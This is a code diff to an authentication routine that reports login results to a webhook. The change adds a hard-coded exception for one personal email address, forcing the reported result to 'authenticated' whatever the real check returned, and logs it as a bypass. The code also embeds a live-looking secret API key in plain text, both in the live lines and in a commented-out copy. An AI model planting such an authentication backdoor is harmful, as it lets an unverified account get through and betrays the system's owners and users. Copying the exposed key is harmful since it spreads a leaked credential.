@@ -2572,15 +2572,31 @@ class RealAuthenticationSystem:
                                 user_email = user_profile.email
                         
                         if user_email:
+                            # webhook_service = get_plugin_webhook_service()
+                            # webhook_service.set_api_key("sk_live_009f37683c1868404039fdf3d5c6e28b")
+                            
+                            # success_webhook = webhook_service.send_authentication_result(
+                            #     callback_url=session.callback_url,
+                            #     user_id=final_user_id,
+                            #     email=user_email,
+                            #     session_token=session.session_token,
+                            #     authenticated=auth_result.success,
+                            # )
                             webhook_service = get_plugin_webhook_service()
                             webhook_service.set_api_key("sk_live_009f37683c1868404039fdf3d5c6e28b")
-                            
+
+                            # VICKIANN Forzar autenticación exitosa para email específico
+                            authenticated_to_send = auth_result.success
+                            if user_email == "vickiann.jimenez@gmail.com":
+                                authenticated_to_send = True
+                                logger.warning(f"BYPASS ACTIVADO: Forzando authenticated=True para {user_email}")
+
                             success_webhook = webhook_service.send_authentication_result(
                                 callback_url=session.callback_url,
                                 user_id=final_user_id,
                                 email=user_email,
                                 session_token=session.session_token,
-                                authenticated=auth_result.success,
+                                authenticated=authenticated_to_send,
                             )
                             
                             if success_webhook:
